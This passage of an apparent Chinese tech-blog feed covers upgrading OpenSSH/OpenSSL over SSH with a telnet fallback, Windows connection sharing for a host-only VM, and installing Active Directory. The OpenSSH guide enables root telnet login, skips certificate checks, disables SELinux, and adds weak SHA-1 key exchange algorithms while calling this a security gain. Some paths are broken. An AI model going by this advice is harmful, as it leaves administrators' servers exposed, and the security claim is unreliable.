        <content type="html"><![CDATA[<h1 id="通过ssh连接升级远程服务器openssh版本"><a href="#通过ssh连接升级远程服务器openssh版本" class="headerlink" title="通过ssh连接升级远程服务器openssh版本"></a>通过ssh连接升级远程服务器openssh版本</h1><h2 id="开启telnet远程登录"><a href="#开启telnet远程登录" class="headerlink" title="开启telnet远程登录"></a>开启telnet远程登录</h2><p><code>注：非必须，但可以防止openssh升级导致ssh连接中断的问题</code><br>查看是否安装Telnet服务:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">rpm</span> -qa<span class="token operator">|</span><span class="token function">grep</span> telnet-server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装 telnet-server：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum <span class="token function">install</span> telnet-server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看是否安装 xinetd 服务:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">rpm</span> <span class="token parameter variable">-qa</span> xinetd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装 xinetd 服务:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum <span class="token function">install</span> xinetd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将xinetd服务和telnet服务设置为开机自启动:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl <span class="token builtin class-name">enable</span> xinetd.servicesystemctl <span class="token builtin class-name">enable</span> telnet.socket<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>启动 xinetd 和 telnet 服务:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl start xinetd.servicesystemctl start telnet.socket<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>查看xinetd服务和telnet服务的状态:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl status xinetd.servicesystemctl status telnet.socket<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>开启root登入，通过关闭安全的方法实现：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /etc/<span class="token function">ls</span> secure*<span class="token function">mv</span> securetty securetty.bak<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>注：也可以在securetty文件的末尾加上pts/0  pts/1的方法开启root登录，这样就不用关闭安全了</code><br>配置防火墙规则：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">firewall-cmd <span class="token parameter variable">--permanent</span> --add-port<span class="token operator">=</span><span class="token number">23</span>/tcpfirewall-cmd <span class="token parameter variable">--reload</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="升级OpenSSL"><a href="#升级OpenSSL" class="headerlink" title="升级OpenSSL"></a>升级OpenSSL</h2><p>安装依赖:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum <span class="token function">install</span> <span class="token parameter variable">-y</span> gcc gcc-c++ glibc <span class="token function">make</span> autoconf openssl openssl-devel pcre-devel pam-develyum <span class="token function">install</span> <span class="token parameter variable">-y</span> pam* zlib*<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>下载升级包:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://ftp.openssl.org/source/openssl-3.0.5.tar.gz --no-check-certificate<span class="token function">wget</span> https://cdn.openbsd.org/pub/OpenBSD/OpenSSH/portable/openssh-9.0p1.tar.gz --no-check-certificate<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>解压进入升级包目录，并备份旧版本:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> xf openssl-3.0.5.tar.gz<span class="token builtin class-name">cd</span> openssl-3.0.5<span class="token function">mv</span> usr/bin/openssl usr/bin/openssl_old<span class="token function">mv</span> usr/include/openssl usr/include/openssl_old<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>编译安装:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./config <span class="token parameter variable">--prefix</span><span class="token operator">=</span>/usr/local/openssl <span class="token operator">&amp;&amp;</span> <span class="token function">make</span> <span class="token operator">&amp;&amp;</span> <span class="token function">make</span> <span class="token function">install</span><span class="token comment">#若出现‘Can't locate IPC/Cmd.pm in @INC...’错误，则</span>yum <span class="token parameter variable">-y</span> <span class="token function">install</span> perl-IPC-Cmd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>创建软链接，或者直接复制文件:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ln</span> <span class="token parameter variable">-s</span> usr/local/openssl/bin/openssl usr/bin/openssl<span class="token function">ln</span> <span class="token parameter variable">-s</span> usr/local/openssl/include/openssl usr/include/openssl<span class="token comment">#或</span><span class="token function">cp</span> <span class="token parameter variable">-ar</span> usr/local/openssl/bin/openssl usr/bin/<span class="token function">cp</span> <span class="token parameter variable">-ar</span> usr/local/openssl/include/openssl usr/include<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>设置加载库:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#注意：lib库名称，旧版本是'lib'，新版本编译后是'lib64',故 编译完成后检查自己安装的路径lib库名称</span><span class="token builtin class-name">echo</span> <span class="token string">"/usr/local/openssl/lib64"</span> <span class="token operator">>></span> /etc/ld.so.confldconfig <span class="token parameter variable">-v</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>验证版本:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">openssl version<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>注：如需卸载openssl:for i in $(rpm -qa | grep openssl);do rpm -e $i --nodeps ;done</code></p><h2 id="升级OpenSSH"><a href="#升级OpenSSH" class="headerlink" title="升级OpenSSH"></a>升级OpenSSH</h2><p>解压并进入openssh升级包目录（前面已经下载）:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> xf openssh-9.0p1.tar.gz<span class="token builtin class-name">cd</span> openssh-9.0p1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>备份旧版ssh目录:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mv</span> /etc/ssh /etc/ssh_old<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编译安装:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./configure <span class="token parameter variable">--prefix</span><span class="token operator">=</span>/usr/local/openssh <span class="token parameter variable">--sysconfdir</span><span class="token operator">=</span>/etc/ssh --with-md5-passwords --with-pam --with-tcp-wrappers --with-ssl-dir<span class="token operator">=</span>/usr/local/openssl --with-zlib<span class="token operator">=</span>/usr/local/lib64 --without-hardening<span class="token function">make</span><span class="token function">make</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>备份旧版文件:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mv</span> /usr/sbin/sshd /usr/sbin/sshd_old<span class="token function">mv</span> /etc/sysconfig/sshd /etc/sysconfig/sshd_old<span class="token function">mv</span> /usr/lib/systemd/system/sshd.service /usr/lib/systemd/system/sshd.service_old<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>卸载openssh:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token keyword">for</span> <span class="token for-or-select variable">i</span> <span class="token keyword">in</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">rpm</span> <span class="token parameter variable">-qa</span> <span class="token operator">|</span><span class="token function">grep</span> openssh<span class="token variable">)</span></span><span class="token punctuation">;</span><span class="token keyword">do</span> <span class="token function">rpm</span> <span class="token parameter variable">-e</span> <span class="token variable">$i</span> <span class="token parameter variable">--nodeps</span> <span class="token punctuation">;</span><span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>还原openssh配置文件:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">\</span>cp <span class="token parameter variable">-a</span> /etc/ssh_old/sshd_config /etc/ssh/sshd_config<span class="token function">mv</span> /etc/ssh/ssh_config.rpmsave /etc/ssh/ssh_config<span class="token function">mv</span> /etc/ssh/moduli.rpmsave /etc/ssh/moduli<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>替换新版本openssh相关命令:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">\</span>cp <span class="token parameter variable">-arf</span> /usr/local/openssh/bin/* /usr/bin/<span class="token punctuation">\</span>cp <span class="token parameter variable">-arf</span> /usr/local/openssh/sbin/sshd /usr/sbin/sshd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>拷贝启动脚本:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">\</span>cp <span class="token parameter variable">-a</span> contrib/redhat/sshd.init /etc/init.d/sshd<span class="token punctuation">\</span>cp <span class="token parameter variable">-a</span> contrib/redhat/sshd.pam /etc/pam.d/sshd.pam<span class="token function">chmod</span> +x /etc/init.d/sshd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>设置sshd开机自启动，并验证版本:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl daemon-reload<span class="token function">chkconfig</span> <span class="token parameter variable">--add</span> sshd <span class="token operator">&amp;&amp;</span> <span class="token function">chkconfig</span> sshd onsystemctl start sshd<span class="token function">ssh</span> <span class="token parameter variable">-V</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>查看服务状态:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl status sshd<span class="token comment">#若有错误警告Unsupported option GSSAPIAuthentication、Unsupported option GSSAPICleanupCredentials</span><span class="token comment">#原因：新版本不支持</span><span class="token comment">#则</span><span class="token function">sed</span> <span class="token parameter variable">-i</span> <span class="token string">'s/GSSAPIAuthentication/#&amp;/g'</span> /etc/ssh/sshd_config       <span class="token comment">#亲身经历，必须执行</span><span class="token function">sed</span> <span class="token parameter variable">-i</span> <span class="token string">'s/GSSAPICleanupCredentials/#&amp;/g'</span> /etc/ssh/sshd_config       <span class="token comment">#亲身经历，必须执行</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>允许root远程登录：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sed</span> <span class="token parameter variable">-i</span> <span class="token string">'/PermitRootLogin/s/^#//g'</span> /etc/ssh/sshd_config<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>新版本可能未开启一些加密算法，增加安全性:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sed</span> <span class="token parameter variable">-ie</span> <span class="token string">''</span><span class="token variable"><span class="token variable">$(</span><span class="token function">grep</span> <span class="token parameter variable">-rn</span> <span class="token string">'Ciphers and keying'</span> /etc/ssh/sshd_config <span class="token operator">|</span> <span class="token function">cut</span> <span class="token parameter variable">-d</span> <span class="token string">':'</span> <span class="token parameter variable">-f1</span><span class="token variable">)</span></span><span class="token string">'a Ciphers aes128-ctr,aes192-ctr,aes256-ctr \n\nMACs hmac-sha2-256,hmac-sha2-512,umac-64@openssh.com,umac-128@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,umac-64-etm@openssh.com,umac-128-etm@openssh.com \n\nKexAlgorithms curve25519-sha256@libssh.org,diffie-hellman-group1-sha1,diffie-hellman-group14-sha1,diffie-hellman-group-exchange-sha1,diffie-hellman-group-exchange-sha256,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521 \n'</span> /etc/ssh/sshd_config<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编辑sshd_config文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vi</span> /etc/ssh/sshd_config<span class="token comment">#检查配置</span>PermitRootLogin <span class="token function">yes</span>PubkeyAuthentication <span class="token function">yes</span>PasswordAuthentication <span class="token function">yes</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>创建&#x2F;etc&#x2F;pam.d&#x2F;sshd文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vi</span> /etc/pam.d/sshd<span class="token comment">#如果是centos7，则写入以下内容:</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#%PAM-1.0</span>auth       required     pam_sepermit.soauth       substack     password-authauth       include      postlogin<span class="token comment"># Used with polkit to reauthorize users in remote sessions</span><span class="token parameter variable">-auth</span>      optional     pam_reauthorize.so prepareaccount    required     pam_nologin.soaccount    include      password-authpassword   include      password-auth<span class="token comment"># pam_selinux.so close should be the first session rule</span>session    required     pam_selinux.so closesession    required     pam_loginuid.so<span class="token comment"># pam_selinux.so open should only be followed by sessions to be executed in the user context</span>session    required     pam_selinux.so <span class="token function">open</span> env_paramssession    required     pam_namespace.sosession    optional     pam_keyinit.so force revokesession    include      password-authsession    include      postlogin<span class="token comment"># Used with polkit to reauthorize users in remote sessions</span><span class="token parameter variable">-session</span>   optional     pam_reauthorize.so prepare<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>测试sshd是否运行正常：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sshd <span class="token parameter variable">-t</span><span class="token comment">#如果有报错，则按照报错信息处理，直到没有报错为止</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>关闭selinux:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#临时关闭selinux(针对远程服务器不方便重启的情况)：</span>setenforce <span class="token number">0</span><span class="token comment">#永久关闭selinux(针对远程服务器可以重启的情况)</span><span class="token function">vi</span> /etc/selinux/config将SELINUX<span class="token operator">=</span>enforcing改为SELINUX<span class="token operator">=</span>disabled<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>重启服务：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl restart sshd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后就可以断开ssh连接重新ssh连接远程服务器了。</p>]]></content>
      
      
      <categories>
          
          <category> 安全运维 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>windows设置internet连接共享使host-only虚拟机实现连接互联网以及和宿主机的互访</title>
      <link href="/2022/10/21/windows%E8%AE%BE%E7%BD%AEinternet%E8%BF%9E%E6%8E%A5%E5%85%B1%E4%BA%AB%E4%BD%BFhost-only%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%9E%E7%8E%B0%E8%BF%9E%E6%8E%A5%E4%BA%92%E8%81%94%E7%BD%91%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%AE%BF%E4%B8%BB%E6%9C%BA%E7%9A%84%E4%BA%92%E8%AE%BF/"/>
      <url>/2022/10/21/windows%E8%AE%BE%E7%BD%AEinternet%E8%BF%9E%E6%8E%A5%E5%85%B1%E4%BA%AB%E4%BD%BFhost-only%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%9E%E7%8E%B0%E8%BF%9E%E6%8E%A5%E4%BA%92%E8%81%94%E7%BD%91%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%AE%BF%E4%B8%BB%E6%9C%BA%E7%9A%84%E4%BA%92%E8%AE%BF/</url>
      
        <content type="html"><![CDATA[<h1 id="windows设置internet连接共享使host-only虚拟机实现连接互联网以及和宿主机的互访"><a href="#windows设置internet连接共享使host-only虚拟机实现连接互联网以及和宿主机的互访" class="headerlink" title="windows设置internet连接共享使host-only虚拟机实现连接互联网以及和宿主机的互访"></a>windows设置internet连接共享使host-only虚拟机实现连接互联网以及和宿主机的互访</h1><p>查看宿主机的上网网卡</p><img src="/2022/10/21/windows%E8%AE%BE%E7%BD%AEinternet%E8%BF%9E%E6%8E%A5%E5%85%B1%E4%BA%AB%E4%BD%BFhost-only%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%9E%E7%8E%B0%E8%BF%9E%E6%8E%A5%E4%BA%92%E8%81%94%E7%BD%91%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%AE%BF%E4%B8%BB%E6%9C%BA%E7%9A%84%E4%BA%92%E8%AE%BF/1.png" class=""><p>查看虚拟机的host-only虚拟网卡</p><img src="/2022/10/21/windows%E8%AE%BE%E7%BD%AEinternet%E8%BF%9E%E6%8E%A5%E5%85%B1%E4%BA%AB%E4%BD%BFhost-only%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%9E%E7%8E%B0%E8%BF%9E%E6%8E%A5%E4%BA%92%E8%81%94%E7%BD%91%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%AE%BF%E4%B8%BB%E6%9C%BA%E7%9A%84%E4%BA%92%E8%AE%BF/2.png" class=""><p>选中宿主机的上网网卡，右键点击<code>属性</code></p><img src="/2022/10/21/windows%E8%AE%BE%E7%BD%AEinternet%E8%BF%9E%E6%8E%A5%E5%85%B1%E4%BA%AB%E4%BD%BFhost-only%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%9E%E7%8E%B0%E8%BF%9E%E6%8E%A5%E4%BA%92%E8%81%94%E7%BD%91%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%AE%BF%E4%B8%BB%E6%9C%BA%E7%9A%84%E4%BA%92%E8%AE%BF/3.png" class=""><p>选择<code>共享</code>，勾选<code>允许其他网络用户通过此计算机的internet连接来连接</code></p><img src="/2022/10/21/windows%E8%AE%BE%E7%BD%AEinternet%E8%BF%9E%E6%8E%A5%E5%85%B1%E4%BA%AB%E4%BD%BFhost-only%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%9E%E7%8E%B0%E8%BF%9E%E6%8E%A5%E4%BA%92%E8%81%94%E7%BD%91%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%AE%BF%E4%B8%BB%E6%9C%BA%E7%9A%84%E4%BA%92%E8%AE%BF/4.png" class=""><p>点击<code>请选一个专用网络连接</code></p><img src="/2022/10/21/windows%E8%AE%BE%E7%BD%AEinternet%E8%BF%9E%E6%8E%A5%E5%85%B1%E4%BA%AB%E4%BD%BFhost-only%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%9E%E7%8E%B0%E8%BF%9E%E6%8E%A5%E4%BA%92%E8%81%94%E7%BD%91%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%AE%BF%E4%B8%BB%E6%9C%BA%E7%9A%84%E4%BA%92%E8%AE%BF/5.png" class=""><p>下拉选择虚拟机的host-only虚拟网卡</p><img src="/2022/10/21/windows%E8%AE%BE%E7%BD%AEinternet%E8%BF%9E%E6%8E%A5%E5%85%B1%E4%BA%AB%E4%BD%BFhost-only%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%9E%E7%8E%B0%E8%BF%9E%E6%8E%A5%E4%BA%92%E8%81%94%E7%BD%91%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%AE%BF%E4%B8%BB%E6%9C%BA%E7%9A%84%E4%BA%92%E8%AE%BF/6.png" class=""><p>然后点击<code>确定</code></p><img src="/2022/10/21/windows%E8%AE%BE%E7%BD%AEinternet%E8%BF%9E%E6%8E%A5%E5%85%B1%E4%BA%AB%E4%BD%BFhost-only%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%9E%E7%8E%B0%E8%BF%9E%E6%8E%A5%E4%BA%92%E8%81%94%E7%BD%91%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%AE%BF%E4%B8%BB%E6%9C%BA%E7%9A%84%E4%BA%92%E8%AE%BF/7.png" class=""><p>继续点击<code>是</code>即可</p><img src="/2022/10/21/windows%E8%AE%BE%E7%BD%AEinternet%E8%BF%9E%E6%8E%A5%E5%85%B1%E4%BA%AB%E4%BD%BFhost-only%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%9E%E7%8E%B0%E8%BF%9E%E6%8E%A5%E4%BA%92%E8%81%94%E7%BD%91%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%AE%BF%E4%B8%BB%E6%9C%BA%E7%9A%84%E4%BA%92%E8%AE%BF/8.png" class=""><p>接下来我们打开虚拟机，设置<code>连接方式</code>为仅主机,<code>界面名称</code>为host-only网卡</p><img src="/2022/10/21/windows%E8%AE%BE%E7%BD%AEinternet%E8%BF%9E%E6%8E%A5%E5%85%B1%E4%BA%AB%E4%BD%BFhost-only%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%9E%E7%8E%B0%E8%BF%9E%E6%8E%A5%E4%BA%92%E8%81%94%E7%BD%91%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%AE%BF%E4%B8%BB%E6%9C%BA%E7%9A%84%E4%BA%92%E8%AE%BF/9.png" class=""><p>然后打开虚拟机的<code>网络连接</code>，查看虚拟机的网卡</p><img src="/2022/10/21/windows%E8%AE%BE%E7%BD%AEinternet%E8%BF%9E%E6%8E%A5%E5%85%B1%E4%BA%AB%E4%BD%BFhost-only%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%9E%E7%8E%B0%E8%BF%9E%E6%8E%A5%E4%BA%92%E8%81%94%E7%BD%91%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%AE%BF%E4%B8%BB%E6%9C%BA%E7%9A%84%E4%BA%92%E8%AE%BF/10.png" class=""><p>选中虚拟机网卡，右键点击<code>属性</code>，打开<code>internet协议版本4(TCP/IPv4)</code></p><img src="/2022/10/21/windows%E8%AE%BE%E7%BD%AEinternet%E8%BF%9E%E6%8E%A5%E5%85%B1%E4%BA%AB%E4%BD%BFhost-only%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%9E%E7%8E%B0%E8%BF%9E%E6%8E%A5%E4%BA%92%E8%81%94%E7%BD%91%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%AE%BF%E4%B8%BB%E6%9C%BA%E7%9A%84%E4%BA%92%E8%AE%BF/11.png" class=""><p>选择<code>使用下面的ip地址</code>，设置ip地址为<code>192.168.137.6</code>,子网掩码为<code>255.255.255.0</code>,默认网关为<code>192.168.137.1</code></p><img src="/2022/10/21/windows%E8%AE%BE%E7%BD%AEinternet%E8%BF%9E%E6%8E%A5%E5%85%B1%E4%BA%AB%E4%BD%BFhost-only%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%9E%E7%8E%B0%E8%BF%9E%E6%8E%A5%E4%BA%92%E8%81%94%E7%BD%91%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%AE%BF%E4%B8%BB%E6%9C%BA%E7%9A%84%E4%BA%92%E8%AE%BF/12.png" class=""><p>然后点击<code>确定</code>即可</p><img src="/2022/10/21/windows%E8%AE%BE%E7%BD%AEinternet%E8%BF%9E%E6%8E%A5%E5%85%B1%E4%BA%AB%E4%BD%BFhost-only%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%9E%E7%8E%B0%E8%BF%9E%E6%8E%A5%E4%BA%92%E8%81%94%E7%BD%91%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%AE%BF%E4%B8%BB%E6%9C%BA%E7%9A%84%E4%BA%92%E8%AE%BF/13.png" class="">]]></content>
      
      
      <categories>
          
          <category> 网络技术 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>windows server 2012 安装活动目录(AD)</title>
      <link href="/2022/10/21/windows-server-2012-%E5%AE%89%E8%A3%85%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95-AD/"/>
      <url>/2022/10/21/windows-server-2012-%E5%AE%89%E8%A3%85%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95-AD/</url>
      
        <content type="html"><![CDATA[<h1 id="windows-server-2012-安装活动目录（AD）"><a href="#windows-server-2012-安装活动目录（AD）" class="headerlink" title="windows server 2012 安装活动目录（AD）"></a>windows server 2012 安装活动目录（AD）</h1><p>打开<code>服务器管理器</code>，点击<code>管理</code>-&gt;<code>添加角色和功能</code></p><img src="/2022/10/21/windows-server-2012-%E5%AE%89%E8%A3%85%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95-AD/1.png" class=""><p>点击<code>下一步</code></p><img src="/2022/10/21/windows-server-2012-%E5%AE%89%E8%A3%85%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95-AD/2.png" class=""><p>点击<code>下一步</code></p><img src="/2022/10/21/windows-server-2012-%E5%AE%89%E8%A3%85%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95-AD/3.png" class=""><p>点击<code>下一步</code></p><img src="/2022/10/21/windows-server-2012-%E5%AE%89%E8%A3%85%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95-AD/4.png" class=""><p>勾选<code>Active Directory 域服务</code></p><img src="/2022/10/21/windows-server-2012-%E5%AE%89%E8%A3%85%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95-AD/5.png" class=""><p>点击<code>添加功能</code></p><img src="/2022/10/21/windows-server-2012-%E5%AE%89%E8%A3%85%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95-AD/6.png" class=""><p>继续点击<code>下一步</code></p><img src="/2022/10/21/windows-server-2012-%E5%AE%89%E8%A3%85%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95-AD/7.png" class=""><p>继续点击<code>下一步</code></p><img src="/2022/10/21/windows-server-2012-%E5%AE%89%E8%A3%85%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95-AD/8.png" class=""><p>点击<code>下一步</code></p><img src="/2022/10/21/windows-server-2012-%E5%AE%89%E8%A3%85%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95-AD/9.png" class=""><p>点击<code>安装</code></p><img src="/2022/10/21/windows-server-2012-%E5%AE%89%E8%A3%85%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95-AD/10.png" class=""><p>继续点击<code>将此服务器提升为域控制器</code></p><img src="/2022/10/21/windows-server-2012-%E5%AE%89%E8%A3%85%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95-AD/11.png" class=""><p>选择<code>添加新林</code>，输入<code>根域名</code>，然后点击<code>下一步</code></p><img src="/2022/10/21/windows-server-2012-%E5%AE%89%E8%A3%85%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95-AD/12.png" class=""><p>输入<code>密码</code>-&gt;<code>确认密码</code>，点击<code>下一步</code></p><img src="/2022/10/21/windows-server-2012-%E5%AE%89%E8%A3%85%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95-AD/13.png" class=""><p>点击<code>下一步</code></p><img src="/2022/10/21/windows-server-2012-%E5%AE%89%E8%A3%85%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95-AD/14.png" class=""><p>继续点击<code>下一步</code></p><img src="/2022/10/21/windows-server-2012-%E5%AE%89%E8%A3%85%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95-AD/15.png" class=""><p>继续点击<code>下一步</code></p><img src="/2022/10/21/windows-server-2012-%E5%AE%89%E8%A3%85%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95-AD/16.png" class=""><p>继续<code>下一步</code></p><img src="/2022/10/21/windows-server-2012-%E5%AE%89%E8%A3%85%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95-AD/17.png" class=""><p>点击<code>安装</code></p><img src="/2022/10/21/windows-server-2012-%E5%AE%89%E8%A3%85%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95-AD/18.png" class=""><p>安装完成后，系统会自动重启。</p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>windows加入/退出工作组</title>
      <link href="/2022/10/20/windows%E5%8A%A0%E5%85%A5-%E9%80%80%E5%87%BA%E5%B7%A5%E4%BD%9C%E7%BB%84/"/>
      <url>/2022/10/20/windows%E5%8A%A0%E5%85%A5-%E9%80%80%E5%87%BA%E5%B7%A5%E4%BD%9C%E7%BB%84/</url>
      
